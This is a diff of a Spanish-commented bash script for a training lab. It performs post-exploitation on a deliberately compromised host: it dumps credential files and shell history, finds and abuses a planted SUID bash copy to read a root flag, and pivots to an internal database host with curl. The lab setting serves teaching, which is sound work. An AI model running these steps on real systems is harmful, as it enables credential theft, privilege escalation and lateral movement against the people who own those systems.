@@ -1,5 +1,7 @@
 #!/usr/bin/env bash
-# Reconocimiento inicial y loot de credenciales (Lab 08 - Parte 1: R1 y R2).
+# Post-explotacion del Lab 08 (Partes 1 y 2: R1 a R4).
+#   Parte 1 -> R1 reconocimiento del host, R2 loot de credenciales.
+#   Parte 2 -> R3 escalada de privilegios (SUID), R4 pivoting al host interno.
 # Ejecutar dentro del host comprometido (make shell-victima como operador).
 set -euo pipefail
 
@@ -25,3 +27,19 @@ cat /var/www/.env
 echo
 echo "--- ~/.bash_history ---"
 cat ~/.bash_history
+echo
+
+echo "=== 5. R3 · Escalada de privilegios (binarios SUID) ==="
+echo "[*] Binarios con bit SUID (uno no es estandar):"
+find / -perm -4000 -type f 2>/dev/null || true   # find sale !=0 por dirs sin permiso
+echo "[*] Binario sospechoso (copia de bash con SUID root):"
+ls -la /usr/local/bin/system-check 2>/dev/null || true
+echo "[*] Explotacion GTFOBins: bash SUID con -p conserva euid=0(root):"
+/usr/local/bin/system-check -p -c 'id; cat /root/flag.txt'
+echo
+
+echo "=== 6. R4 · Pivoting al host interno (red segmentada) ==="
+echo "[*] Interfaces de red (la victima es dual-homed: labnet + internalnet):"
+ip -br a 2>/dev/null || ip a
+echo "[*] Pivot: el host interno phantomcorp-db solo se alcanza DESDE aca:"
+curl -s http://phantomcorp-db/ ; echo
